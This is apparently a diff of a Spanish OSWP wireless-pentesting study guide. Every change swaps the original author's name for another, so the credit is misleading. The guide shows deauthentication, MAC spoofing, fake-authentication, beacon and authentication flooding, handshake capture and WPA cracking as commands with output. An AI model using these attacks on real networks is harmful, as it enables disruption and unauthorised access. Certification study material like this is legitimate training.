@@ -17,7 +17,7 @@ tags:
   - Guías
 ---
 
-# Preparación para el OSWP (by s4vitar)
+# Preparación para el OSWP (by flippermen)
 
 ![OSWP Image](https://funkyimg.com/i/2VTJW.jpg)
 #### Offensive Security Wireless Attacks (WiFu) course and Offensive Security Wireless Professional (OSWP) Cheat Sheet
@@ -25,7 +25,7 @@ tags:
 <br>
 Esta guía es la misma que tengo publicada en mi Gist:
 
-* [https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb](https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb)
+* [https://gist.github.com/flippermen/3b42532d7d78bafc824fb28a95c8a5eb](https://gist.github.com/flippermen/3b42532d7d78bafc824fb28a95c8a5eb)
 
 ## Índice y Estructura Principal
 - [Antecedentes - Experiencia Personal](#Antecedentes)
@@ -234,7 +234,7 @@ Para comprobar si nuestra tarjeta de red acepta el modo monitor, haremos una pru
 Empecemos con un par de comandos básicos. A continuación os listo mi tarjeta de red:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ifconfig wlan0
 wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.1.187  netmask 255.255.255.0  broadcast 192.168.1.255
@@ -251,7 +251,7 @@ Espero que a partir de ahora os llevéis bien con ella, pues con esta practicare
 Para poner en modo monitor nuestra tarjeta de red, es tan simple como aplicar el siguiente comando:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #airmon-ng start wlan0
 
 Found 5 processes that could cause trouble.
@@ -286,14 +286,14 @@ conectividad y mantenernos con conexión en una red ya estando asociados, lo cua
 Matar estos procesos es sencillo, tenemos la siguiente forma:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pkill dhclient && pkill wpa_supplicant
 ```
 
 O si deseamos tirar de la propia suite:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #airmon-ng check kill
 
 Killing these processes:
@@ -306,7 +306,7 @@ Ya con esto, nuestra tarjeta de red está en modo monitor. Una forma de comproba
 listando nuestras interfaces de red. Ahora nuestra red **wlan0** debería llamarse **wlan0mon**:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ifconfig | grep wlan0 -A 6
 wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         unspec E4-70-B8-D3-93-5C-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
@@ -323,7 +323,7 @@ Importante, ¿cómo desactivar el modo monitor y hacer que todo vuelva a la norm
 conectividad?, sencillo. Podemos hacer uso de los siguientes comandos para restablecer la conexión:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #airmon-ng stop wlan0mon && service network-manager restart
 
 PHY	Interface	Driver		Chipset
@@ -334,7 +334,7 @@ phy0	wlan0mon	iwlwifi		Intel Corporation Wireless 7265 (rev 61)
 
 		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)
 
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ping -c 10 -i 0.01 -q google.es
 PING google.es (172.217.17.3) 56(84) bytes of data.
 
@@ -363,7 +363,7 @@ AGENCY** (**NSA**), ¿cómo se procedería?. Primero buscamos la dirección MAC 
 dispone 'macchanger':
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #macchanger -l | grep -i "national security agency"
 8310 - 00:20:91 - J125, NATIONAL SECURITY AGENCY
 ```
@@ -378,19 +378,19 @@ Es decir, que si quisiera falsificar una dirección MAC registrada bajo el **OUI
 siguiente:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ifconfig wlan0mon down
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #echo "$(macchanger -l | grep -i "national security agency" | awk '{print $3}'):da:1b:6a"
 00:20:91:da:1b:6a
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #macchanger --mac=$(!!) wlan0mon
 Current MAC:   e4:70:b8:d3:93:5c (unknown)
 Permanent MAC: e4:70:b8:d3:93:5c (unknown)
 New MAC:       00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ifconfig wlan0mon up
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #macchanger -s wlan0mon
 Current MAC:   00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
 Permanent MAC: e4:70:b8:d3:93:5c (unknown)
@@ -549,7 +549,7 @@ De esta forma, una vez comienza el escaneo, se generan los siguientes ficheros e
 trabajo:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ls
 Captura-01.cap  Captura-01.csv  Captura-01.kismet.csv  Captura-01.kismet.netxml  Captura-01.log.csv
 ```
@@ -616,7 +616,7 @@ punto de acceso. Para expulsar al cliente, haremos uso de la utilidad de **airep
 '**Aireplay-ng**' cuenta con diferentes modos:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #echo; aireplay-ng --help | tail -n 13 | grep -v help | sed '/^\s*$/d' | sed 's/^ *//'; echo
 
 --deauth      count : deauthenticate 1 or all stations (-0)
@@ -658,7 +658,7 @@ Esto mismo lo podríamos haber hecho especificando la dirección MAC del AP en v
 Obteniendo los siguientes resultados:
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar]
+┌─[✗]─[root@parrot]─[/home/flippermen]
 └──╼ #aireplay-ng -0 10 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon
 20:48:28  Waiting for beacon frame (BSSID: 20:34:FB:B1:C5:53) on channel 1
 20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [18|65 ACKs]
@@ -686,7 +686,7 @@ a recordar los puntos de acceso a los que alguna vez han estado conectados.
 Esto es así debido a los paquetes **Probe Request**:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -i wlan0mon -Y 'wlan.fc.type_subtype==4' 2>/dev/null
    49 1.516614496 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=98, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
   242 9.119006178 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=112, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
@@ -751,7 +751,7 @@ hará será reconectarse al AP, sin nosotros tener que hacer nada. Y es en este 
 Obteniendo los siguientes resultados:
 
  ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #aireplay-ng -0 10 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon
 21:10:33  Waiting for beacon frame (ESSID: hacklab) on channel 12
 Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
@@ -775,7 +775,7 @@ deautenticación global:
 Obteniendo estos resultados:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #aireplay-ng -0 10 -e hacklab wlan0mon
 21:11:46  Waiting for beacon frame (ESSID: hacklab) on channel 12
 Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
@@ -809,7 +809,7 @@ ataque.
 Inyectar a un cliente es bastante sencillo, lo hacemos a través del parámetro '**-1**' de aireplay:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #echo; aireplay-ng --help | tail -n 13 | grep "\-1" | sed '/^\s*$/d' | sed 's/^ *//'; echo
 
 --fakeauth    delay : fake authentication with AP (-1)
@@ -834,7 +834,7 @@ Veamos cómo podríamos por ejemplo llevar a cabo una falsa autenticación hacie
 como estación:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
+┌─[root@parrot]─[/home/flippermen]
 └──╼ #aireplay-ng -1 0 -e MOVISTAR_1677 -h 00:a0:8b:cd:02:65 wlan0mon
 21:20:28  Waiting for beacon frame (ESSID: MOVISTAR_1677) on channel 6
 Found BSSID "1C:B0:44:D4:16:78" to given ESSID "MOVISTAR_1677".
@@ -886,7 +886,7 @@ asociar a miles de clientes al AP objetivo. Esto se hace haciendo uso de la sigu
 Veámoslo en la práctica, aplicamos el comando por un lado:
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar]
+┌─[✗]─[root@parrot]─[/home/flippermen]
 └──╼ #mdk3 wlan0mon a -a 20:34:FB:B1:C5:53 # Dirección MAC del AP hacklab
 ```
 
@@ -1045,7 +1045,7 @@ Un **beacon** es un paquete que contiene información sobre el punto de acceso, 
 se encuentra, qué tipo de cifrado lleva, cómo se llama la red, etc.
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
+┌─[✗]─[root@parrot]─[/home/flippermen/Desktop]
 └──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==0x8" 2>/dev/null
     1 0.000000000 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1585, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
     2 0.307210202 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1588, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
@@ -1063,9 +1063,9 @@ de acceso objetivo, logrando así dañar el espectro de onda de la red dejándol
 usuarios.
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop]
+┌─[root@parrot]─[/home/flippermen/Desktop]
 └──╼ #for i in $(seq 1 10); do echo "MyNetwork$i" >> redes.txt; done
-┌─[root@parrot]─[/home/s4vitar/Desktop]
+┌─[root@parrot]─[/home/flippermen/Desktop]
 └──╼ #cat redes.txt 
 MyNetwork1
 MyNetwork2
@@ -1077,7 +1077,7 @@ MyNetwork7
 MyNetwork8
 MyNetwork9
 MyNetwork10
-┌─[root@parrot]─[/home/s4vitar/Desktop]
+┌─[root@parrot]─[/home/flippermen/Desktop]
 └──╼ #mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 7
 ```
 
@@ -1162,7 +1162,7 @@ desde **aircrack-ng**. Si quisiéramos ahora validarlo desde **Pyrit**, haríamo
 '.cap':
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pyrit -r Captura-01.cap analyze
 Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
 https://github.com/JPaulMora/Pyrit
@@ -1181,7 +1181,7 @@ Handshake.
 Veamos ahora un caso donde sí nos reporta que la captura cuenta con un Handshake válido:
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[✗]─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pyrit -r Captura-02.cap analyze
 Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
 https://github.com/JPaulMora/Pyrit
@@ -1210,15 +1210,15 @@ Con la herramienta **tshark**, podemos generar una nueva captura filtrando únic
 interesa de la captura previamente realizada:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-02.cap -Y "eapol" 2>/dev/null
    34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
    36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
    40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
    42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-02.cap -Y "eapol" 2>/dev/null -w filteredCapture
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pyrit -r filteredCapture analyze
 Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
 https://github.com/JPaulMora/Pyrit
@@ -1243,7 +1243,7 @@ filtro para seguir desechando paquetes no necesarios pero filtrando algo más de
 nuestro AP víctima, haciendo uso para ello del operador **OR**:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-02.cap -Y "wlan.fc.type_subtype==0x08 || eapol" 2>/dev/null
     1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
    34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
@@ -1258,9 +1258,9 @@ primera línea.
 Si exportamos dicha captura y analizamos ahora desde **Pyrit**:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-02.cap -Y "wlan.fc.type_subtype==0x08 || eapol" 2>/dev/null -w filteredCapture
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pyrit -r filteredCapture analyze
 Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
 https://github.com/JPaulMora/Pyrit
@@ -1280,7 +1280,7 @@ El campo **'None'** es sustituido por el **ESSID** de la red.
 además de los paquetes **Beacon** es preferible filtrar también por los paquetes **Probe Response**.
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-02.cap -Y "wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol" 2>/dev/null
     1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
     3   0.374849 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2287, FN=0, Flags=........, BI=100, SSID=hacklab
@@ -1310,7 +1310,7 @@ Para este caso, como sabemos que la dirección MAC del AP es **20:34:fb:b1:c5:53
 Pyrit), una buena práctica sería hacer lo siguiente:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-02.cap -Y "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" 2>/dev/null
     1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
     3   0.374849 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2287, FN=0, Flags=........, BI=100, SSID=hacklab
@@ -1336,9 +1336,9 @@ Pyrit), una buena práctica sería hacer lo siguiente:
 Por último y para que no os asustéis, fijaros qué curioso:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-02.cap -Y "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" -w filteredCapture 2>/dev/null
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #aircrack-ng filteredCapture 
 Opening filteredCapture wait...
 Unsupported file format (not a pcap or IVs file).
@@ -1356,9 +1356,9 @@ de exportar la captura desde **tshark**, si queremos que **aircrack** nos lo int
 especificar en el modo de exportación para la captura el formato **pcap**, de la siguiente forma:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-02.cap -R "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" -2 -w filteredCapture -F pcap 2>/dev/null
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #aircrack-ng filteredCapture 
 Opening filteredCapture wait...
 Read 19 packets.
@@ -1531,7 +1531,7 @@ podemos hacer uso de este parseador para representar toda la información de los
 Correr el script es bastante sencillo:
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
+┌─[✗]─[root@parrot]─[/home/flippermen/Desktop]
 └──╼ #./file.sh 
 
 Especifica el fichero .csv a analizar
@@ -1539,7 +1539,7 @@ Especifica el fichero .csv a analizar
 Uso:
 	./parser.sh Captura-01.csv
 
-┌─[root@parrot]─[/home/s4vitar/Desktop]
+┌─[root@parrot]─[/home/flippermen/Desktop]
 └──╼ #./file.sh captura-01.csv 
 
 [!] Archivo oui.txt no encontrado, descárgalo desde aquí: http://standards-oui.ieee.org/oui/oui.txt
@@ -1556,7 +1556,7 @@ Por tanto:
 Una vez hecho, ya podemos ejecutar el script, obteniendo los siguientes resultados:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop]
+┌─[root@parrot]─[/home/flippermen/Desktop]
 └──╼ #./file.sh captura-01.csv 
 
 Número total de puntos de acceso: 43
@@ -1731,7 +1731,7 @@ el análisis de paquetes y capturas:
 * Paquetes Probe Request
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" 2>/dev/null
   175 22.140053472 JuniperN_2c:47:40 → Broadcast    802.11 178 Probe Request, SN=2376, FN=0, Flags=........C, SSID=WLAN_C311
   185 26.153075819 Apple_ed:e2:63 → Broadcast    802.11 214 Probe Request, SN=1959, FN=0, Flags=........C, SSID=Wlan1
@@ -1744,7 +1744,7 @@ el análisis de paquetes y capturas:
 * Paquetes Probe Response
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==5" 2>/dev/null
     2   1.617473 XiaomiCo_b1:c5:53 → 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1872, FN=0, Flags=........, BI=100, SSID=hacklab
     5   1.628735 XiaomiCo_b1:c5:53 → 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1874, FN=0, Flags=........, BI=100, SSID=hacklab
@@ -1757,7 +1757,7 @@ el análisis de paquetes y capturas:
 * Paquetes Association Request
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==0" 2>/dev/null
    22   5.041479 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 802.11 122 Association Request, SN=227, FN=0, Flags=........, SSID=hacklab
 ```
@@ -1765,7 +1765,7 @@ el análisis de paquetes y capturas:
 * Paquetes Association Response
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==1" 2>/dev/null
    24   5.049663 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 127 Association Response, SN=2346, FN=0, Flags=........
 ```
@@ -1773,7 +1773,7 @@ el análisis de paquetes y capturas:
 * Paquetes Beacon
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==8" 2>/dev/null
     1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1855, FN=0, Flags=........, BI=100, SSID=hacklab
 ```
@@ -1781,7 +1781,7 @@ el análisis de paquetes y capturas:
 * Paquete Authentication
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==11" 2>/dev/null
    18   5.033280 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 802.11 30 Authentication, SN=226, FN=0, Flags=........
    20   5.035840 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 30 Authentication, SN=2344, FN=0, Flags=........
@@ -1790,7 +1790,7 @@ el análisis de paquetes y capturas:
 * Paquetes Deauthentication
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==12" 2>/dev/null
   200 39.994017471 AskeyCom_d4:16:78 → Broadcast    802.11 38 Deauthentication, SN=0, FN=0, Flags=........
   201 39.994777432 AskeyCom_d4:16:78 → Broadcast    802.11 39 Deauthentication, SN=0, FN=0, Flags=........
@@ -1809,7 +1809,7 @@ tshark -i wlan0mon -Y "wlan.fc.type_subtype==10" 2>/dev/null # Para este caso no
 * Paquetes Clear To Send (CTS)
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[✗]─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==28" 2>/dev/null
   183 11.333769733              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
   186 11.334796342              → XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
@@ -1831,7 +1831,7 @@ tshark -i wlan0mon -Y "wlan.fc.type_subtype==10" 2>/dev/null # Para este caso no
 * Paquetes ACK
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==29" 2>/dev/null
    44 2.532918866              → XiaomiCo_d0:51:c5 (a4:50:46:d0:51:c5) (RA) 802.11 70 Acknowledgement, Flags=........C
   213 4.870822127              → 72:4f:56:d5:f4:21 (72:4f:56:d5:f4:21) (RA) 802.11 70 Acknowledgement, Flags=........C
@@ -1861,10 +1861,10 @@ semejante.
 Por tanto, aquí una demostración:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ls
 Captura-01.cap
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #aircrack-ng -J miCaptura Captura-01.cap 
 Opening Captura-01.cape wait...
 Read 5110 packets.
@@ -1908,7 +1908,7 @@ Building Hashcat file...
 
 Successfully written to miCaptura.hccap
 
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ls
 Captura-01.cap  miCaptura.hccap
 ```
@@ -1916,9 +1916,9 @@ Captura-01.cap  miCaptura.hccap
 Una vez hecho, hacemos uso de **hccap2john** para visualizar el hash:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #hccap2john miCaptura.hccap > miHash
-┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[✗]─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #cat !$
 cat miHash
 hacklab:$WPAPSK$hacklab#61HvgQJHB23RFh2sFppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri1yfPj3mekwEJ7KgIFRMGYeQi3xQqdS3eIJWCGSK29gS.21.5I0.Ec............/FppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri..................................................................3X.I.E..1uk2.E..1uk2.E..1uk0....................................................................................................................................................................................../t.....U....kCht3dkTvxtRY6EWvYdHk:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap
@@ -1935,17 +1935,17 @@ anteriormente visto, ya que contamos con un Hash... resulta sencillo crackear la
 haciendo uso de un diccionario a través de la herramienta **John**, de la siguiente forma:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt miHash --format=wpapsk
 Using default input encoding: UTF-8
 Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 256/256 AVX2 8x])
 No password hashes left to crack (see FAQ)
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #john --show --format=wpapsk miHash 
 hacklab:vampress1:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap
 
 1 password hash cracked, 0 left
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #echo "Password: $(john --show --format=wpapsk miHash | cut -d ':' -f 2)"
 Password: vampress1
 ```
@@ -1991,7 +1991,7 @@ para aumentar nuestra velocidad de cómputo, superando las 10 millones de contra
 Ya que **aircrack** no es capaz de tirar por GPU, en caso de que tengáis una GPU como en mi caso:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #nvidia-detect 
 Detected NVIDIA GPUs:
 01:00.0 VGA compatible controller [0300]: NVIDIA Corporation GP107M [GeForce GTX 1050 Mobile] [10de:1c8d] (rev a1)
@@ -2001,7 +2001,7 @@ Lo mejor es tirar de **Hashcat** para estos casos. Para correr la herramienta, p
 es el método numérico correspondiente a **WPA**:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #hashcat -h | grep -i wpa
    2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols
    2501 | WPA-EAPOL-PMK                                    | Network Protocols
@@ -2014,7 +2014,7 @@ archivo de tipo '**.hccapx**', específico para la combinación de Hashcat. Para
 '**-j**' de aircrack (esta vez es minúscula):
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #aircrack-ng -j hashcatCapture Captura-01.cap 
 Opening Captura-01.cape wait...
 Read 5110 packets.
@@ -2058,7 +2058,7 @@ Building Hashcat (3.60+) file...
 
 Successfully written to hashcatCapture.hccapx
 
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #ls
 Captura-01.cap  hashcatCapture.hccapx
 ```
@@ -2355,7 +2355,7 @@ Una vez capturado un Handshake, podemos hacer uso de Pyrit para crackear la cont
 de la siguiente forma:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough
 Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
 https://github.com/JPaulMora/Pyrit
@@ -2373,7 +2373,7 @@ de fuerza bruta, usando el diccionario especificado a través del parámetro '**
 Una vez obtenida la contraseña:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+┌─[root@parrot]─[/home/flippermen/Desktop/Red]
 └──╼ #pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough
 Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
 https://github.com/JPaulMora/Pyrit
@@ -2397,7 +2397,7 @@ sorprenderá.
